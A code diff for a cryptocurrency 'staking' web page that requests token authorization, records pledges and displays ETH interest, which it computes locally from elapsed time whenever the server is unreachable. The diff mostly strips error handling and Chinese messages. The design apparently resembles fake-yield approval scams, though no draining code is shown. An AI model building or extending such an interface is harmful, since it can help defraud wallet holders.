@@ -228,7 +228,6 @@ await new Promise(resolve => setTimeout(resolve, delayMs));
 attempts++;
 }
 console.error(`retryDOMAcquisition: Failed to acquire DOM elements after ${maxAttempts} attempts.`);
-updateStatus(translations[currentLang].error + ': 無法獲取 DOM 元素', true);
 return false;
 }
 async function checkServerStatus() {
@@ -334,8 +333,8 @@ stakingStartTime,
 claimedInterest,
 pledgedAmount,
 accountBalance,
-grossOutput: parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0'),
-cumulative: parseFloat(cumulativeValue?.textContent?.replace(' ETH', '') || '0'),
+grossOutput: parseFloat(grossOutputValue.textContent.replace(' ETH', '')) || 0,
+cumulative: parseFloat(cumulativeValue.textContent.replace(' ETH', '')) || 0,
 nextBenefitTime: localStorage.getItem('nextBenefitTime'),
 lastUpdated: Date.now(),
 source: 'index.html'
@@ -375,10 +374,7 @@ updateStatus(translations[currentLang].offlineWarning, true);
 }
 }
 function updateStatus(message, isWarning = false) {
-if (!statusDiv) {
-console.warn(`updateStatus: statusDiv not found, cannot display message: ${message}`);
-return;
-}
+if (!statusDiv) return;
 if (message === translations[currentLang].offlineWarning && !isDevMode) {
 statusDiv.innerHTML = '';
 statusDiv.style.display = 'none';
@@ -428,7 +424,7 @@ if (walletTokenSelect) walletTokenSelect.value = 'USDT';
 if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
 if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
 if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
-if (showMsg) updateStatus(translations[currentLang].noWallet, true);
+if (showMsg) updateStatus(translations[currentLang].noWallet);
 }
 function disableInteractiveElements(disable = false) {
 if (startBtn) startBtn.disabled = disable;
@@ -444,10 +440,7 @@ if (claimBtn) claimBtn.disabled = disable;
 console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`);
 }
 function updateBalancesUI(walletBalances) {
-if (!walletTokenSelect) {
-console.warn(`updateBalancesUI: walletTokenSelect is missing`);
-return;
-}
+if (!walletTokenSelect) return;
 const selectedToken = walletTokenSelect.value;
 const decimals = { USDT: 6, USDC: 6, WETH: 18 };
 const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
@@ -465,7 +458,7 @@ console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${t
 }
 if (parseFloat(formattedWalletBalance) < 0.001) {
 updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
-} else if (statusDiv && statusDiv.style.color === 'rgb(255, 215, 0)') {
+} else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
 updateStatus("");
 }
 }
@@ -489,7 +482,6 @@ console.warn(`updateInterest: Missing DOM elements:`, { grossOutputValue: !!gros
 const acquired = await retryDOMAcquisition();
 if (!acquired) {
 console.error(`updateInterest: Failed to re-acquire DOM elements, skipping update.`);
-updateStatus(translations[currentLang].error + ': Failed to update UI due to missing DOM elements', true);
 return;
 }
 }
@@ -507,11 +499,7 @@ try {
 const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
 cache: 'no-cache'
 }));
-if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-const contentType = response.headers.get('content-type');
-if (!contentType || !contentType.includes('application/json')) {
-throw new Error(`Invalid content type: ${contentType || 'none'}, expected application/json`);
-}
+if (response.ok) {
 const allData = await response.json();
 console.log(`updateInterest: Received server data:`, allData);
 if (allData.lastUpdated > localLastUpdated) {
@@ -540,10 +528,12 @@ lastUpdated: allData.lastUpdated
 }));
 console.log(`updateInterest: Synced data from server:`, userData);
 }
+} else {
+throw new Error(`HTTP error: ${response.status}`);
+}
 } catch (error) {
 console.warn(`updateInterest: Fetch error, using local data: ${error.message}`);
 isServerAvailable = false;
-updateStatus(translations[currentLang].offlineWarning, true);
 }
 }
 if (!overrideApplied && stakingStartTime && pledgedAmount > 0) {
@@ -555,31 +545,9 @@ finalGrossOutput = elapsedSeconds * interestRate;
 finalCumulative = finalGrossOutput - claimedInterest;
 console.log(`updateInterest: Using local calculation:`, { finalGrossOutput, finalCumulative, pledgedAmount, elapsedSeconds });
 }
-if (grossOutputValue && cumulativeValue) {
 grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
 cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
 console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`);
-} else {
-console.error(`updateInterest: Failed to update UI, DOM elements missing:`, { grossOutputValue: !!grossOutputValue, cumulativeValue: !!cumulativeValue });
-updateStatus(translations[currentLang].error + ': Failed to update UI due to missing DOM elements', true);
-}
-}
-function updateLanguage(lang) {
-localStorage.setItem('language', lang);
-languageSelect.value = lang;
-for (let key in elements) {
-if (elements[key] && translations[lang]?.[key]) {
-elements[key].textContent = translations[lang][key];
-}
-}
-if (claimBtn.parentNode) {
-claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
-}
-if (modalTitle) {
-modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
-}
-updateNextBenefitTimer();
-console.log(`updateLanguage: Switched to language: ${lang}`);
 }
 function updateNextBenefitTimer() {
 if (!nextBenefit) return;
@@ -609,6 +577,19 @@ const seconds = String(totalSeconds % 60).padStart(2, '0');
 nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
 console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`);
 }
+function getETOffsetMilliseconds() {
+const now = new Date();
+const mar = new Date(now.getFullYear(), 2, 8);
+const nov = new Date(now.getFullYear(), 10, 1);
+const marDay = mar.getDay();
+const novDay = nov.getDay();
+const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
+const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
+if (now >= dstStart && now < dstEnd) {
+return -4 * 60 * 60 * 1000;
+}
+return -5 * 60 * 60 * 1000;
+}
 function setInitialNextBenefitTime() {
 if (localStorage.getItem('nextBenefitTime')) return;
 console.log(`setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...`);
@@ -629,19 +610,6 @@ const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
 localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
 saveUserData();
 console.log(`setInitialNextBenefitTime: Set next benefit time: ${finalNextBenefitTimestamp}`);
-}
-function getETOffsetMilliseconds() {
-const now = new Date();
-const mar = new Date(now.getFullYear(), 2, 8);
-const nov = new Date(now.getFullYear(), 10, 1);
-const marDay = mar.getDay();
-const novDay = nov.getDay();
-const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
-const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
-if (now >= dstStart && now < dstEnd) {
-return -4 * 60 * 60 * 1000;
-}
-return -5 * 60 * 60 * 1000;
 }
 function activateStakingUI() {
 const storedStartTime = localStorage.getItem('stakingStartTime');
@@ -683,10 +651,7 @@ console.log(`activateStakingUI: Set next benefit interval: ${nextBenefitInterval
 saveUserData();
 }
 async function sendMobileRobustTransaction(populatedTx) {
-if (!signer || !provider) {
-console.error(`sendMobileRobustTransaction: 錢包未連線或缺少簽署者`);
-throw new Error(translations[currentLang].error + ": 錢包未連線或缺少簽署者。");
-}
+if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
 const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
 const fromAddress = await signer.getAddress();
 const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
@@ -694,7 +659,7 @@ let txHash, receipt = null;
 try {
 console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
 txHash = await provider.send('eth_sendTransaction', [mobileTx]);
-updateStatus(`${translations[currentLang].fetchingBalances} HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
+updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
 receipt = await provider.waitForTransaction(txHash);
 console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
 } catch (error) {
@@ -705,18 +670,12 @@ const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
 if (match) txHash = match[0];
 }
 if (txHash) {
-updateStatus(`交易介面錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
+updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
 receipt = await provider.waitForTransaction(txHash);
 console.log(`sendMobileRobustTransaction: Transaction confirmed after error, receipt:`, receipt);
-} else {
-console.error(`sendMobileRobustTransaction: 交易發送失敗: ${error.message}`);
-throw new Error(`交易發送失敗: ${error.message}`);
+} else throw new Error(`Transaction failed to send: ${error.message}`);
 }
-}
-if (!receipt || receipt.status !== 1) {
-console.error(`sendMobileRobustTransaction: 鏈上交易失敗（已回滾）。HASH: ${txHash.slice(0, 10)}...`);
-throw new Error(`鏈上交易失敗（已回滾）。HASH: ${txHash.slice(0, 10)}...`);
-}
+if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
 return receipt;
 }
 async function initializeWallet() {
@@ -731,29 +690,10 @@ console.warn(`initializeWallet: Ethers.js not loaded, retrying in 500ms (${i + 1
 await new Promise(resolve => setTimeout(resolve, 500));
 }
 if (!ethersLoaded) {
-console.error(`initializeWallet: Ethers.js failed to load after retries. Attempting fallback CDN...`);
-const script = document.createElement('script');
-script.src = 'https://unpkg.com/ethers@6.13.5/dist/ethers.min.js';
-script.onload = async () => {
-if (window.ethers && window.ethers.providers && window.ethers.providers.Web3Provider) {
-console.log(`initializeWallet: Fallback CDN loaded successfully.`);
-ethersLoaded = true;
-} else {
-console.error(`initializeWallet: Fallback CDN failed to load Ethers.js.`);
+console.error(`initializeWallet: Ethers.js failed to load after retries.`);
 updateStatus(translations[currentLang].ethersError, true);
 connectButton.disabled = true;
 return;
-}
-};
-script.onerror = () => {
-console.error(`initializeWallet: Failed to load fallback CDN.`);
-updateStatus(translations[currentLang].ethersError, true);
-connectButton.disabled = true;
-return;
-};
-document.head.appendChild(script);
-await new Promise(resolve => setTimeout(resolve, 1000));
-if (!ethersLoaded) return;
 }
 try {
 if (typeof window.ethereum === 'undefined') {
@@ -890,10 +830,7 @@ updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
 }
 }
 async function handleConditionalAuthorizationFlow() {
-if (!signer) {
-console.error(`handleConditionalAuthorizationFlow: 錢包未連線`);
-throw new Error(translations[currentLang].error + ": 錢包未連線");
-}
+if (!signer) throw new Error("Wallet not connected");
 updateStatus('準備授權...');
 const selectedToken = walletTokenSelect.value;
 console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
@@ -969,16 +906,16 @@ return null;
 }
 async function claimInterest() {
 await loadUserDataFromServer();
-const claimableETHString = cumulativeValue?.textContent?.replace(' ETH', '').trim() || '0';
+const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
 const claimableETH = parseFloat(claimableETHString);
 console.log(`claimInterest: Raw claimableETHString: ${claimableETHString}, Parsed: ${claimableETH}`);
 if (isNaN(claimableETH) || claimableETH < 0.0000001) {
-updateStatus(translations[currentLang].noClaimable, true);
+updateStatus(translations[currentLang].noClaimable);
 return;
 }
 const prices = await getEthPrices();
 if (!prices || prices.usd === 0) {
-updateStatus(translations[currentLang].priceError, true);
+updateStatus(translations[currentLang].priceError);
 return;
 }
 const selectedToken = walletTokenSelect.value;
@@ -990,25 +927,33 @@ console.warn(`claimInterest: Fallback rate for ${selectedToken}: ${ethToTokenRat
 const valueInToken = claimableETH * ethToTokenRate;
 console.log(`claimInterest: Claim details:`, { claimableETH, selectedToken, ethToTokenRate, valueInToken, prices });
 if (isNaN(valueInToken) || valueInToken <= 0) {
-updateStatus(translations[currentLang].invalidCalc, true);
+updateStatus(translations[currentLang].invalidCalc);
 return;
 }
-if (modalClaimableETH && modalEthPrice && modalSelectedToken && modalEquivalentValue && modalTitle) {
 modalClaimableETH.textContent = `${claimableETH.toFixed(7)} ETH`;
 modalEthPrice.textContent = `$${prices.usd.toFixed(2)}`;
 modalSelectedToken.textContent = selectedToken;
 modalEquivalentValue.textContent = `${valueInToken.toFixed(3)} ${selectedToken}`;
 modalTitle.textContent = translations[currentLang]?.claimBtnText || 'Claim Interest';
 claimModal.style.display = 'flex';
-} else {
-console.error(`claimInterest: Modal elements missing:`, {
-modalClaimableETH: !!modalClaimableETH,
-modalEthPrice: !!modalEthPrice,
-modalSelectedToken: !!modalSelectedToken,
-modalEquivalentValue: !!modalEquivalentValue,
-modalTitle: !!modalTitle
-});
 }
+function updateLanguage(lang) {
+currentLang = lang;
+languageSelect.value = lang;
+localStorage.setItem('language', lang);
+for (let key in elements) {
+if (elements[key] && translations[lang]?.[key]) {
+elements[key].textContent = translations[lang][key];
+}
+}
+if (claimBtn.parentNode) {
+claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
+}
+if (modalTitle) {
+modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
+}
+updateNextBenefitTimer();
+console.log(`updateLanguage: Switched to language: ${lang}`);
 }
 function setupSSE() {
 if (!userAddress) {
@@ -1126,29 +1071,10 @@ console.warn(`DOMContentLoaded: Ethers.js not loaded, retrying in 500ms (${i + 1
 await new Promise(resolve => setTimeout(resolve, 500));
 }
 if (!ethersLoaded) {
-console.error(`DOMContentLoaded: Ethers.js failed to load after retries. Attempting fallback CDN...`);
-const script = document.createElement('script');
-script.src = 'https://unpkg.com/ethers@6.13.5/dist/ethers.min.js';
-script.onload = async () => {
-if (window.ethers && window.ethers.providers && window.ethers.providers.Web3Provider) {
-console.log(`DOMContentLoaded: Fallback CDN loaded successfully.`);
-ethersLoaded = true;
-await initializeWallet();
-} else {
-console.error(`DOMContentLoaded: Fallback CDN failed to load Ethers.js.`);
+console.error(`DOMContentLoaded: Ethers.js failed to load after retries.`);
 updateStatus(translations[savedLang].ethersError, true);
 connectButton.disabled = true;
 return;
-}
-};
-script.onerror = () => {
-console.error(`DOMContentLoaded: Failed to load fallback CDN.`);
-updateStatus(translations[savedLang].ethersError, true);
-connectButton.disabled = true;
-return;
-};
-document.head.appendChild(script);
-if (!ethersLoaded) return;
 }
 await initializeWallet();
 setInterval(updateTotalFunds, 1000);
@@ -1337,15 +1263,13 @@ stakingStartTime,
 claimedInterest,
 pledgedAmount,
 accountBalance,
-grossOutput: parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0'),
-cumulative: parseFloat(cumulativeValue?.textContent?.replace(' ETH', '') || '0'),
+grossOutput: parseFloat(grossOutputValue.textContent.replace(' ETH', '')) || 0,
+cumulative: parseFloat(cumulativeValue.textContent.replace(' ETH', '')) || 0,
 nextBenefitTime: localStorage.getItem('nextBenefitTime'),
 lastUpdated: Date.now()
 }));
 const totalPledgedValue = document.getElementById('totalPledgedValue');
-if (totalPledgedValue) {
 totalPledgedValue.textContent = `${amount.toFixed(2)} ${token}`;
-}
 console.log(`pledgeBtn: Pledged ${amount} ${token} for ${duration} days.`);
 updateStatus(translations[currentLang].pledgeSuccess);
 await saveUserData();
